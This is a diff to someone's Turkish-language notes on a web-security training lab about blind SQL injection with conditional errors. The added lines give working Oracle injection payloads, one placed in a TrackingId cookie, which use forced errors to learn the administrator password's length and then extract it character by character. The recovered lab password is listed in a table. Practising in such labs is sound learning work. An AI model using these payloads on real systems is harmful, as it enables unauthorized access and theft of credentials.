@@ -131,3 +131,37 @@ hpv2krlq3kioy6aze0y3
 
 #### 12.Lab: Blind SQL injection with conditional errors
 
+Password uzunluğu bulmamıza yarayan querry
+'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+Internal server error vermeyi 20 de bırakıyor
+
+Password harflerini tek tek çıkaran querry
+Cookie: TrackingId=1tfmSjKBM4BSqBLy'||(SELECT CASE WHEN SUBSTR(password,20,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+her internal srever error da bir karakter bulmuş oluyoruz
+
+iqjcld9aci6sexljtive
+
+| sayi | deger |
+| ---- | ----- |
+| 1    | i     |
+| 2    | q     |
+| 3    | j     |
+| 4    | c     |
+| 5    | l     |
+| 6    | d     |
+| 7    | 9     |
+| 8    | a     |
+| 9    | c     |
+| 10   | i     |
+| 11   | 6     |
+| 12   | s     |
+| 13   | e     |
+| 14   | x     |
+| 15   | l     |
+| 16   | j     |
+| 17   | t     |
+| 18   | i     |
+| 19   | v     |
+| 20   | e     |
